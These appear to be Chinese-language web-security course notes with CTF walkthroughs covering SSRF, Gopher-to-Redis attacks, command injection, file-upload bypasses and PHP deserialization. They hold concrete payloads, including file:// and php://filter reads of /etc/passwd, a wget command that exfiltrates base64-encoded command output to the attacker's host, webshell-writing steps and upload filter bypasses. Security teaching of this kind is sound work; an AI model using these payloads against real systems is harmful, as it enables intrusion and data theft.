<h5 id="CVE-2020-4046漏洞分析"><a href="#CVE-2020-4046漏洞分析" class="headerlink" title="CVE-2020-4046漏洞分析"></a>CVE-2020-4046漏洞分析</h5><p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759070058592-6c957341-80b5-492b-8ace-7a564edaf7fb.png"></p>
<ul>
<li>前置条件：<ul>
<li>准备两个文件：<ul>
<li>payload.htm：包含恶意oEmbed链接</li>
<li>payload.json：携带iframe载荷</li>
</ul>
</li>
<li>必须部署在公网服务器（防止SSRF检测）</li>
</ul>
</li>
<li>payload设计要点：<ul>
<li>iframe的src指向不存在地址</li>
<li>精心构造title属性中的引号嵌套：</li>
</ul>
</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759070343325-8f1a6055-f181-4f8f-a596-6c7c64476e9a.png"></p>
<h2 id="四，SSRF"><a href="#四，SSRF" class="headerlink" title="四，SSRF"></a><font style="color:#DF2A3F;">四，SSRF</font></h2><ul>
<li>基本概念：SSRF(Server Side Request Forgery)是通过构造数据伪造服务端发起请求的漏洞</li>
<li>攻击特点：请求由服务端内部发起，主要攻击目标是从外网无法访问的内部系统</li>
<li>形成原理：服务端提供从外部获取数据功能但未对目标地址、协议等参数进行过滤限制</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759073107946-9570dc38-9bfe-43fd-b3af-ffc071df935e.png"></p>
<p><font style="color:#5C8D07;">识别ssrf</font></p>
<ul>
<li>完整结构：<font style="color:#f00;">scheme:[&#x2F;authority]path[?query][#fragment]</font></li>
<li>关键组件：<ul>
<li>scheme：大小写不敏感的协议标识符</li>
<li>authority：<ul>
<li>userinfo：username:passwordusername:passwordusername:password格式的身份验证信息</li>
<li>host：服务器地址（域名&#x2F;IPv4&#x2F;IPv6）</li>
<li>port：不填则使用协议默认端口（HTTP:80，FTP:21）</li>
</ul>
</li>
<li>path：资源路径，用”&#x2F;“分层</li>
<li>query：以”?”开头的查询字符串（如?name&#x3D;crane?name&#x3D;crane?name&#x3D;crane）</li>
<li>fragment：以”#”开头的片段ID，不会发送到服务端</li>
</ul>
</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759073055584-28f366c6-5370-4526-846a-0ea2448bca7e.png"></p>
<ul>
<li><p><font style="color:#5C8D07;">攻击示例：</font></p>
<ul>
<li><font style="color:#5C8D07;">正常使用：</font><font style="color:#5C8D07;">u</font><font style="color:#5C8D07;">r</font><font style="color:#5C8D07;">l</font><font style="color:#5C8D07;">&#x3D;</font><font style="color:#5C8D07;">h</font><font style="color:#5C8D07;">t</font><font style="color:#5C8D07;">t</font><font style="color:#5C8D07;">p</font><font style="color:#5C8D07;">s</font><font style="color:#5C8D07;">:</font><font style="color:#5C8D07;">&#x2F;</font><font style="color:#5C8D07;">&#x2F;</font><font style="color:#5C8D07;">w</font><font style="color:#5C8D07;">w</font><font style="color:#5C8D07;">w</font><font style="color:#5C8D07;">.</font><font style="color:#5C8D07;">b</font><font style="color:#5C8D07;">a</font><font style="color:#5C8D07;">i</font><font style="color:#5C8D07;">d</font><font style="color:#5C8D07;">u</font><font style="color:#5C8D07;">.</font><font style="color:#5C8D07;">c</font><font style="color:#5C8D07;">o</font><font style="color:#5C8D07;">m</font><font style="color:#5C8D07;">url&#x3D;<a target="_blank" rel="noopener" href="https://www.baidu.com/">https://www.baidu.com</a></font><font style="color:#5C8D07;">u</font><font style="color:#5C8D07;">r</font><font style="color:#5C8D07;">l</font><font style="color:#5C8D07;">&#x3D;</font><font style="color:#5C8D07;">h</font><font style="color:#5C8D07;">ttp</font><font style="color:#5C8D07;">s</font><font style="color:#5C8D07;">:</font><font style="color:#5C8D07;">&#x2F;&#x2F;</font><font style="color:#5C8D07;">www</font><font style="color:#5C8D07;">.</font><font style="color:#5C8D07;">bai</font><font style="color:#5C8D07;">d</font><font style="color:#5C8D07;">u</font><font style="color:#5C8D07;">.</font><font style="color:#5C8D07;">co</font><font style="color:#5C8D07;">m</font></li>
<li><font style="color:#5C8D07;">恶意利用：url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwdurl&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</font></li>
<li><font style="color:#5C8D07;">url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</font></li>
</ul>
</li>
<li><p><font style="color:#5C8D07;">文件读取限制：以PHP运行权限为标准，只能读取PHP进程有权访问的文件</font></p>
</li>
<li><p><font style="color:#5C8D07;">常见攻击目标</font><font style="color:#5C8D07;">：</font></p>
<ul>
<li><font style="color:#5C8D07;">&#x2F;etc&#x2F;passwd（用户信息）</font></li>
<li><font style="color:#5C8D07;">网站源码（如&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php）</font></li>
<li><font style="color:#5C8D07;">Apache配置（&#x2F;etc&#x2F;apache2&#x2F;）</font></li>
</ul>
</li>
</ul>
<p><font style="color:rgb(34,34,34);background-color:#2F8EF4;">f12url参数给出了http协议头，因此猜测可能存在SSRF漏洞—–&gt;使用</font><font style="color:rgb(199,37,78);background-color:#2F8EF4;">php:&#x2F;&#x2F;filter&#x2F;&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd</font><font style="color:rgb(34,34,34);background-color:#2F8EF4;">可以读取到passwd文件，使用</font><font style="color:rgb(199,37,78);background-color:#2F8EF4;">php:&#x2F;&#x2F;filter&#x2F;&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;index.php</font><font style="color:rgb(34,34,34);background-color:#2F8EF4;">可以读取到index.php的源码——–&gt;发现提示，flag在根目录flag文件中——–&gt;使用</font><font style="color:rgb(199,37,78);background-color:#2F8EF4;">php:&#x2F;&#x2F;filter&#x2F;&#x2F;resource&#x3D;&#x2F;flag</font><font style="color:rgb(34,34,34);background-color:#2F8EF4;">读取到passwd文件</font></p>
<p><font style="color:rgb(34,34,34);">Gopherus</font></p>
<ul>
<li><font style="color:rgb(34,34,34);">协议格式</font><font style="color:rgb(34,34,34);">:</font><font style="color:rgb(34,34,34);">g</font><font style="color:rgb(34,34,34);">o</font><font style="color:rgb(34,34,34);">p</font><font style="color:rgb(34,34,34);">h</font><font style="color:rgb(34,34,34);">e</font><font style="color:rgb(34,34,34);">r</font><font style="color:rgb(34,34,34);">:</font><font style="color:rgb(34,34,34);">&#x2F;</font><font style="color:rgb(34,34,34);">&#x2F;</font><font style="color:rgb(34,34,34);">&lt;</font><font style="color:rgb(34,34,34);">h</font><font style="color:rgb(34,34,34);">o</font><font style="color:rgb(34,34,34);">s</font><font style="color:rgb(34,34,34);">t</font><font style="color:rgb(34,34,34);">&gt;</font><font style="color:rgb(34,34,34);">:</font><font style="color:rgb(34,34,34);">&lt;</font><font style="color:rgb(34,34,34);">p</font><font style="color:rgb(34,34,34);">o</font><font style="color:rgb(34,34,34);">r</font><font style="color:rgb(34,34,34);">t</font><font style="color:rgb(34,34,34);">&gt;</font><font style="color:rgb(34,34,34);">1</font><font style="color:rgb(34,34,34);">&#x2F;</font><font style="color:rgb(34,34,34);">&lt;</font><font style="color:rgb(34,34,34);">u</font><font style="color:rgb(34,34,34);">r</font><font style="color:rgb(34,34,34);">l</font><font style="color:rgb(34,34,34);">编码的</font><font style="color:rgb(34,34,34);">T</font><font style="color:rgb(34,34,34);">C</font><font style="color:rgb(34,34,34);">P</font><font style="color:rgb(34,34,34);">数据</font><font style="color:rgb(34,34,34);">&gt;</font><font style="color:rgb(34,34,34);">gopher:&#x2F;&#x2F;<host>:<port>1&#x2F;&lt;url编码的TCP数据&gt;</font><font style="color:rgb(34,34,34);">g</font><font style="color:rgb(34,34,34);">o</font><font style="color:rgb(34,34,34);">p</font><font style="color:rgb(34,34,34);">h</font><font style="color:rgb(34,34,34);">er</font><font style="color:rgb(34,34,34);">:</font><font style="color:rgb(34,34,34);">&#x2F;&#x2F;</font><font style="color:rgb(34,34,34);">&lt;</font><font style="color:rgb(34,34,34);">h</font><font style="color:rgb(34,34,34);">os</font><font style="color:rgb(34,34,34);">t</font><font style="color:rgb(34,34,34);">&gt;:&lt;</font><font style="color:rgb(34,34,34);">p</font><font style="color:rgb(34,34,34);">or</font><font style="color:rgb(34,34,34);">t</font><font style="color:rgb(34,34,34);">&gt;</font><font style="color:rgb(34,34,34);">1&#x2F;</font><font style="color:rgb(34,34,34);">&lt;</font><font style="color:rgb(34,34,34);">u</font><font style="color:rgb(34,34,34);">r</font><font style="color:rgb(34,34,34);">l</font><font style="color:rgb(34,34,34);">编码的</font><font style="color:rgb(34,34,34);">TCP</font><font style="color:rgb(34,34,34);">数据</font><font style="color:rgb(34,34,34);">&gt;</font></li>
<li><font style="color:rgb(34,34,34);">核心优势</font><font style="color:rgb(34,34,34);">:</font><ul>
<li><font style="color:rgb(34,34,34);">任意TCP模拟</font><font style="color:rgb(34,34,34);">: 可将任意TCP协议流量进行URL编码后发送</font></li>
<li><font style="color:rgb(34,34,34);">无状态特性</font><font style="color:rgb(34,34,34);">: 适合模拟HTTP、Redis等无状态协议</font></li>
</ul>
</li>
<li><font style="color:rgb(34,34,34);">关键限制</font><font style="color:rgb(34,34,34);">:</font><ul>
<li><font style="color:rgb(34,34,34);">单次发送</font><font style="color:rgb(34,34,34);">: 会一次性发送全部流量，不支持多轮交互</font></li>
<li><font style="color:rgb(34,34,34);">协议限制: 无法模拟需要认证的协议如MySQL</font></li>
</ul>
</li>
</ul>
<p><font style="color:rgb(34,34,34);"></font></p>
<p><font style="color:rgb(34,34,34);"></font></p>
<h6 id="Gopher协议的支持情况"><a href="#Gopher协议的支持情况" class="headerlink" title="Gopher协议的支持情况"></a><font style="color:rgb(34,34,34);">Gopher协议的支持情况</font></h6><ul>
<li>PHP: 需编译时开启curlwrappers且版本≥5.3</li>
<li>Java: 仅JDK&lt;1.7版本支持</li>
<li>Curl: 低版本不支持</li>
<li>Perl: 全版本支持</li>
<li>ASP.NET: 仅版本&lt;3支持</li>
<li>特殊场景: PHP使用curl扩展时仍可通过curl_init支持</li>
</ul>
<h6 id="使用Gopher访问Redis"><a href="#使用Gopher访问Redis" class="headerlink" title="使用Gopher访问Redis"></a>使用Gopher访问Redis</h6><p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759074538073-230d94a6-f80c-4f8d-80d8-c7b0358a55e3.png"></p>
<pre><code>- 基本结构:
    * *&lt;参数数量&gt;CRLF 表示数组开始
    * $&lt;参数长度&gt;CRLF 表示字符串参数
- 攻击场景:
    * 写入webshell
    * 修改crontab计划任务
    * 写入SSH公钥
    * 加载恶意Redis模块
</code></pre>
<ul>
<li><p>通过socat获取Redis协议流</p>
<ul>
<li>操作流程:<ul>
<li>redis-cli flushall</li>
<li>通过管道写入crontab命令</li>
<li>设置存储目录为&#x2F;var&#x2F;spool&#x2F;cron</li>
<li>设置存储文件名为root</li>
<li>执行save命令</li>
</ul>
</li>
</ul>
</li>
</ul>
<p> Gopherus工具  （流量分析）</p>
<p>命令 python2 gopherus.py –exploit fastcgi</p>
<h5 id="SSRF绕过"><a href="#SSRF绕过" class="headerlink" title="SSRF绕过"></a>SSRF绕过</h5><h6 id="IP地址变形"><a href="#IP地址变形" class="headerlink" title="IP地址变形"></a>IP地址变形</h6><p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759075151926-f2efa606-60ba-4ce4-8cf1-cca9ebb3d983.png"></p>
<ul>
<li>进制转换:<ul>
<li>十六进制: 0x7f000001</li>
<li>十进制: 2130706433</li>
</ul>
</li>
<li>省略写法: 127.1代替127.0.0.1</li>
<li>特殊表示:<ul>
<li>Windows中0&#x3D;0.0.0.0</li>
<li>Linux中0&#x3D;127.0.0.1</li>
</ul>
</li>
<li>符号替代: 使用圈数字符号(如①)代替数字</li>
</ul>
<h6 id="2）利用跳转-12-41"><a href="#2）利用跳转-12-41" class="headerlink" title="2）利用跳转 12:41"></a>2）利用跳转 12:41</h6><ul>
<li>302跳转: 通过可控服务器进行跳转</li>
<li>协议转换: 利用不同协议间的转换特性</li>
<li>服务限制: 依赖服务端是否允许自动跳转</li>
</ul>
<h6 id="利用URL解析问题-13-07"><a href="#利用URL解析问题-13-07" class="headerlink" title="利用URL解析问题 13:07"></a>利用URL解析问题 13:07</h6><ul>
<li>经典案例: <a target="_blank" rel="noopener" href="http://a%40127.0.0.1:80@baidu.com/">http://a@127.0.0.1:80@baidu.com</a><ul>
<li>PHP解析host为baidu.com</li>
<li>libcurl(&lt;7.54.0)解析host为127.0.0.1</li>
</ul>
</li>
<li>其他差异: PHP中parse_url与readfile的解析差异</li>
</ul>
<h6 id="4）利用DNS-15-00"><a href="#4）利用DNS-15-00" class="headerlink" title="4）利用DNS 15:00"></a>4）利用DNS 15:00</h6><ul>
<li>动态解析: 使用nip.io等服务</li>
<li>DNS重绑定:<ul>
<li>首次解析返回合法IP</li>
<li>二次解析返回内网IP</li>
</ul>
</li>
<li>防御突破: 绕过基于DNS的SSRF检测机制</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759075428620-a77b625c-9637-4757-8406-578db9586f66.png"></p>
<p><font style="color:rgb(34,34,34);background-color:#E4495B;">看到源码识别ssrf，在使用了curl的情况下，我们就可以构造gopher协议来访问其他服务——&gt;尝试一些常用的服务端口，使用http协议进行探测，观察相应时间和返回内容，发现redis服务—-&gt;使用工具Gopherus构造写入webshell的流量——-&gt;将工具生成的gopher流量发送到服务器中———–&gt;工具生成的webshell在web目录的shell.php中，访问密码为cmd。利用该webshell读取根目录文件，发现flag</font></p>
<p>11</p>
<h2 id="五，命令注入"><a href="#五，命令注入" class="headerlink" title="五，命令注入"></a><font style="color:#DF2A3F;">五，命令注入</font></h2><ul>
<li>定义：当开发者使用可执行命令的函数且未对用户输入进行安全检查时，可能造成命令注入漏洞。</li>
<li>危害：<ul>
<li>直接读取flag文件内容</li>
<li>反弹shell获取服务器控制权</li>
<li>控制题目环境干扰其他队伍解题</li>
</ul>
</li>
<li>常见危险函数：<ul>
<li>PHP：system()、exec()、shell_exec()</li>
<li>Python：os.system()</li>
<li>Java：Runtime.exec()</li>
</ul>
</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759116150734-cf04755b-90be-43cd-a1c0-d599b3b5f5d6.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759116204523-fa0a19d2-72cd-42f3-9bf1-70587a1e8f8d.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759116277873-8fd8e76f-7488-4e43-92f3-ee9dc22afbab.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759116495542-149142fc-2149-4960-9b2e-19fd12cd84a0.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759116797339-ecfda3c0-cf9e-44d6-8254-d02913fb6fe3.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759116831834-c78d6c35-c6a7-46f5-a427-8c854620b352.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759116900660-6470958f-69f6-4c64-b0e4-f00830f5b183.png"></p>
<h6 id="漏洞组件Node-js环境"><a href="#漏洞组件Node-js环境" class="headerlink" title="漏洞组件Node.js环境"></a>漏洞组件Node.js环境</h6><ul>
<li>运行机制: 基于V8引擎运行在操作系统层面，提供系统交互接口</li>
<li>语言特性: 使用JavaScript语法，适合开发Web服务器和小工具</li>
<li>包管理: 使用npm或yarn作为包管理工具</li>
</ul>
<p><font style="color:rgb(34,34,34);background-color:#1DC0C9;">打开站点后直接显示了网站源码——-&gt;网站存在两个api，”&#x2F;api&#x2F;getServices”，”&#x2F;api&#x2F;checkSite”，这两个api分别用于获取系统服务和访问远程站点———–&gt;</font></p>
<p><font style="color:rgb(34,34,34);background-color:#1DC0C9;">直接将用户输入传入给</font><font style="color:rgb(199,37,78);background-color:#1DC0C9;">si.services</font><font style="color:rgb(34,34,34);background-color:#1DC0C9;">会导致命令注入。</font></p>
<p><font style="color:rgb(34,34,34);background-color:#1DC0C9;">使用</font><font style="color:rgb(199,37,78);background-color:#1DC0C9;">&#x2F;api&#x2F;getServices?name[]&#x3D;$(sleep 1)</font><font style="color:rgb(34,34,34);background-color:#1DC0C9;">，可以观察到延时，说明存在命令注入漏洞————&gt;通过</font><font style="color:rgb(199,37,78);background-color:#1DC0C9;">$(which command &amp;&amp; sleep 1)</font><font style="color:rgb(34,34,34);background-color:#1DC0C9;">的方法，去判断command是否存在，如果存在则造成延时，不存在则不延时。最后发现存在wget、base64等命令，可以用于请求远程服务器，传递请求结果——————&gt;在我们的主机中运行一个http服务器，监听8000端口，然后发送</font><font style="color:rgb(199,37,78);background-color:#1DC0C9;">$(wget <a target="_blank" rel="noopener" href="http://192.168.1.101:8000/?a=$">http://192.168.1.101:8000/?a=$</a>(ls &#x2F; | base64))</font><font style="color:rgb(34,34,34);background-color:#1DC0C9;">到目标服务中，其中192.168.1.101是我们主机的ip地址————&gt;在http的请求日志中观察到收集到的命令执行结果，然后将其base64解码，得到文件&#x2F;flag_fa5ca659，因此再构造一个命令：</font><font style="color:rgb(199,37,78);background-color:#1DC0C9;">$(wget <a target="_blank" rel="noopener" href="http://192.168.1.101:8000/?a=$">http://192.168.1.101:8000/?a=$</a>(cat &#x2F;flag_fa5ca659))</font><font style="color:rgb(34,34,34);background-color:#1DC0C9;">，在http日志中观察到flag</font></p>
<p><font style="color:rgb(34,34,34);"></font></p>
<p>11</p>
<h2 id="六，文件上传"><a href="#六，文件上传" class="headerlink" title="六，文件上传"></a><font style="color:#DF2A3F;">六，文件上传</font></h2><ul>
<li>常见场景：Web业务中常见的功能，包括上传用户头像、图片、附件等</li>
<li>安全隐患：若服务端未对上传文件做好处理，可能导致严重安全问题，如被上传木马文件造成RCE（远程代码执行）</li>
</ul>
<h6 id="PHP文件上传示例"><a href="#PHP文件上传示例" class="headerlink" title="PHP文件上传示例"></a>PHP文件上传示例</h6><ul>
<li>核心函数：<ul>
<li>$_FILES数组：PHP内置数组，存储用户上传文件信息</li>
<li>move_uploaded_file()：将临时文件移动到指定位置</li>
</ul>
</li>
<li>漏洞成因：直接使用用户提供的文件名保存到web可访问目录</li>
<li>攻击示例：<ul>
<li>通过curl上传包含恶意代码的PHP文件</li>
<li>两种常见后门类型：<ul>
<li>system后门：直接执行系统命令，便于手动测试</li>
<li>eval后门：执行任意PHP代码，常用于webshell管理工具</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="文件名截断绕过"><a href="#文件名截断绕过" class="headerlink" title="文件名截断绕过"></a>文件名截断绕过</h5><p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759118023877-251d761e-c02d-4ce1-b864-743fd7d461f3.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759118247388-eff9515e-4d9d-4654-bdf4-15b2dc863149.png"></p>
<ul>
<li>操作步骤：<ul>
<li>构造文件名如”1.php\x00a.jpg”</li>
<li>使用hex编辑器将空格改为”\x00”</li>
<li>上传后实际保存为”1.php”</li>
</ul>
</li>
<li>字符集截断：<ul>
<li>原理：iconv函数转换非常规字符时可能截断</li>
<li>示例：文件名包含”\x90”等超出UTF-8范围的字符</li>
</ul>
</li>
</ul>
<h6 id="上传文件重命名"><a href="#上传文件重命名" class="headerlink" title="上传文件重命名"></a>上传文件重命名</h6><ul>
<li>绕过方法：<ul>
<li>冷门扩展名：<ul>
<li>PHP：php3、php5、phtml、pht</li>
<li>ASP：cdx、cer、asa</li>
<li>JSP：jspx</li>
</ul>
</li>
<li>系统特性：<ul>
<li>Windows NTFS流文件：如”php::$DATA”</li>
<li>末尾点截断：Windows会忽略文件名末尾的点</li>
</ul>
</li>
</ul>
</li>
</ul>
<h6 id="上传文件不重命名"><a href="#上传文件不重命名" class="headerlink" title="上传文件不重命名"></a>上传文件不重命名</h6><p> 上传.htaccess  </p>
<pre><code>- 生效条件：
    * Apache版本&lt;2.3.8（默认AllowOverride All）
    * 高版本可能被发行版手动配置为All
- 利用方式：
- 注意事项：需精确匹配特定文件名才有效
</code></pre>
<p> 上传.user.ini  </p>
<pre><code>- 生效条件：
    * PHP≥5.3.0
    * 仅CGI/FastCGI模式有效
- 关键配置：
    * auto_prepend_file：指定预解析文件
    * auto_append_file：指定后解析文件
- 利用步骤：
    * 上传合法扩展名的木马文件
    * 上传.user.ini配置预解析
    * 访问同目录下任意PHP文件触发
</code></pre>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759119491033-f2f83b1b-e02b-407f-a8f4-7104092a7bc1.png"></p>
<h5 id="白名单扩展名校验"><a href="#白名单扩展名校验" class="headerlink" title="白名单扩展名校验"></a>白名单扩展名校验</h5><h6 id="IIS解析缺陷"><a href="#IIS解析缺陷" class="headerlink" title="IIS解析缺陷"></a>IIS解析缺陷</h6><ul>
<li>目录解析特性：在IIS6.0中，”.asp”和”.asa”目录下的任何扩展名文件都会被当作ASP文件解析执行。例如目录”a.asp”中存在文件”a.asp&#x2F;1.jpg”，”1.jpg”会被当作ASP文件执行。</li>
<li>分号截断特性：对于文件名”a.asp;a.jpg”，IIS会忽略分号后的内容，将文件当作”a.asp”解析执行。</li>
</ul>
<h6 id="Nginx解析缺陷"><a href="#Nginx解析缺陷" class="headerlink" title="Nginx解析缺陷"></a>Nginx解析缺陷</h6><ul>
<li>配置缺陷原理：当Nginx未设置try_files指令进行文件存在性检查，且PHP-FPM未设置”security.limit_extensions”限制时，可通过上传”1.jpg”后访问”1.jpg&#x2F;1.php”触发解析缺陷。</li>
<li>执行流程：<ul>
<li>上传木马文件”1.jpg”</li>
<li>访问”1.jpg&#x2F;1.php”时，Nginx匹配到”.php$”规则转发给FPM</li>
<li>PHP启用”cgi.fix_pathinfo”时会fallback到”1.jpg”</li>
<li>若未设置扩展名限制，PHP会执行”1.jpg”中的代码</li>
</ul>
</li>
<li>安全更新：自PHP 5.3.9起，”security.limit_extensions”默认值为”.php”和”.phar”</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759284102580-2595591f-0396-4c95-ab17-1ce4b453ad7a.png"></p>
<h6 id="Apache解析缺陷"><a href="#Apache解析缺陷" class="headerlink" title="Apache解析缺陷"></a>Apache解析缺陷</h6><pre><code>- 解析规则：Apache支持多扩展名，从右向左匹配第一个已知扩展名。例如配置&quot;AddHandler application/x-httpd-php .php&quot;时，&quot;a.php.jpg&quot;会被当作PHP执行。
- 绕过技巧：使用不在Apache mime列表中的扩展名如&quot;a.php.xxx&quot;，确保&quot;.php&quot;是第一个匹配到的有效扩展名。
</code></pre>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759284227230-a9b9ab38-419d-447f-a4eb-a06c017d1176.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759284310902-0de36558-7bc9-4a93-a4ce-fca49e3d229e.png"></p>
<h5 id="文件上传后禁止访问绕过"><a href="#文件上传后禁止访问绕过" class="headerlink" title="文件上传后禁止访问绕过"></a>文件上传后禁止访问绕过</h5><h6 id="“-htaccess”禁止脚本文件解析-09-20"><a href="#“-htaccess”禁止脚本文件解析-09-20" class="headerlink" title="“.htaccess”禁止脚本文件解析 09:20"></a>“.htaccess”禁止脚本文件解析 09:20</h6><ul>
<li>绕过原理：Apache 2.3.9后”AllowOverride”默认为None，使上传目录中的”.htaccess”文件失效，从而绕过禁止解析限制。</li>
</ul>
<h6 id="2）上传文件到OSS-10-05"><a href="#2）上传文件到OSS-10-05" class="headerlink" title="2）上传文件到OSS 10:05"></a>2）上传文件到OSS 10:05</h6><ul>
<li>利用方式：虽然OSS无法解析脚本，但可通过上传HTML文件实现XSS攻击，需确保OSS域名与网站一致。</li>
</ul>
<h6 id="3）配合文件包含-10-41"><a href="#3）配合文件包含-10-41" class="headerlink" title="3）配合文件包含 10:41"></a>3）配合文件包含 10:41</h6><ul>
<li>组合利用：当存在文件包含漏洞如”include$_GET[‘page’];”时，无论上传文件扩展名为何，均可通过文件包含执行其中的代码。</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759284423105-6a267526-ac91-4a58-96a9-622fc0652122.png"></p>
<h5 id="文件类型检查绕过"><a href="#文件类型检查绕过" class="headerlink" title="文件类型检查绕过"></a>文件类型检查绕过</h5><h6 id="getimagesize绕过"><a href="#getimagesize绕过" class="headerlink" title="getimagesize绕过"></a>getimagesize绕过</h6><ul>
<li>GIF头绕过：在PHP代码前添加”GIF98a”文件头，既可通过getimagesize检测，又可被PHP解析执行。</li>
<li>XBM格式绕过：在文件中包含”#define width 1”和”#define height 1”定义，使getimagesize返回有效图像信息。</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759284551644-587b4180-827e-4562-aa33-c44d45579812.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759284619205-e95d91a6-9973-4c31-85e2-8511148fdfe0.png"></p>
<h6 id="imagecreatefromjpeg绕过"><a href="#imagecreatefromjpeg绕过" class="headerlink" title="imagecreatefromjpeg绕过"></a>imagecreatefromjpeg绕过</h6><ul>
<li>工具利用：使用BlackFan的jpg_payload.php工具将脚本嵌入jpg图片，即使经过imagecreatefromjpeg转换仍保留可执行代码。</li>
<li>实现原理：将payload嵌入到图片的特定区域，避免在图像重新渲染时被清除</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759284640309-b58789dd-8b3e-4178-88cc-b57a75f88a41.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759284668146-62023f8d-c713-4385-9cc6-bd3fbece3137.png"></p>
<p>111</p>
<h4 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h4><h2 id="七，PHP序列化和反序列化"><a href="#七，PHP序列化和反序列化" class="headerlink" title="七，PHP序列化和反序列化"></a><font style="color:#DF2A3F;">七，PHP序列化和反序列化</font></h2><ul>
<li>定义:<ul>
<li>序列化：将对象转换为可传输的字节序列的过程</li>
<li>反序列化：将字节序列重新转换为对象的过程</li>
</ul>
</li>
<li>目的：实现对象的跨平台存储和网络传输</li>
<li>基本数据类型示例：<ul>
<li>字符串：”this is a test”</li>
<li>整数：2021</li>
<li>数组：[1,2,3]</li>
</ul>
</li>
<li>必要性：<ul>
<li>不同机器对基本数据类型定义一致（如整型、字符串）</li>
<li>但复杂类定义（如自定义类）在不同机器间无法直接理解</li>
<li>需要序列化机制解决复杂数据类型的传输问题</li>
</ul>
</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759287088253-c4ebfd32-0b42-4a97-aba6-7d8e344664bb.png"></p>
<h6 id="序列化操作示例"><a href="#序列化操作示例" class="headerlink" title="序列化操作示例"></a>序列化操作示例</h6><ul>
<li>PHP序列化函数：<ul>
<li>serialize()：将PHP值序列化为</li>
<li>字符串</li>
<li>unserialize()：将字符串反序列化为PHP值</li>
</ul>
</li>
<li>示例解析：<ul>
<li>整数60序列化结果：i:60;</li>
<li>字符串”this is a test”序列化结果：s:14:”this is a test”;</li>
<li>数组序列化结果：a:2:{s:1:”a”;i:1;s:1:”b”;i:2;}</li>
</ul>
</li>
<li>反序列化验证：<ul>
<li>反序列化整数60：unserialize(“i:60;”) → int(60)</li>
<li>反序列化字符串：unserialize(“s:14:&quot;this is a test&quot;;”) → string(14) “this is a test”</li>
<li>反序列化数组：unserialize(“a:2:{s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;}”) → 还原原始数</li>
</ul>
</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759287283034-59c60eeb-de9e-4696-9e05-fc84adda6e09.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759287307887-ad50ac89-84aa-4d9e-8564-e025de9fb7c8.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759287440520-a183af14-db76-4786-a509-7ac94eb7e784.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759287482280-09c5e205-3ea6-4335-8a3d-4bb1e66d9749.png"></p>
<h5 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h5><ul>
<li>定义：PHP中以双下划线__开头的特殊方法</li>
<li>关键方法：<ul>
<li>__construct()：对象创建(new)时自动调用，但反序列化时不调用</li>
<li>__destruct()：对象销毁时自动调用</li>
<li>__wakeup()：反序列化时自动调用</li>
</ul>
</li>
<li>执行顺序：<ul>
<li>反序列化时：先执行__wakeup()，脚本结束时执行__destruct()</li>
<li>创建对象时：执行__construct()</li>
</ul>
</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759287565763-92ffe900-1157-41bc-bb96-fefb7c6be385.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759287644958-4fb89073-5109-4e82-8ab9-8f11cc22a645.png"></p>
<h6 id="反序列化过程演示"><a href="#反序列化过程演示" class="headerlink" title="反序列化过程演示"></a>反序列化过程演示</h6><ul>
<li>安全风险：<ul>
<li>恶意代码可隐藏在魔术方法中</li>
<li>示例：__wakeup()中执行system($this-&gt;test)</li>
<li>通过控制test成员变量可执行任意系统命令</li>
</ul>
</li>
<li>攻击示例：<ul>
<li>构造序列化字符串：O:4:”test”:1:{s:4:”test”;s:2:”ls”;}</li>
<li>反序列化时自动执行system(“ls”)命令</li>
<li>输出系统目录结构（如&#x2F;bin、&#x2F;boot等）</li>
</ul>
</li>
</ul>
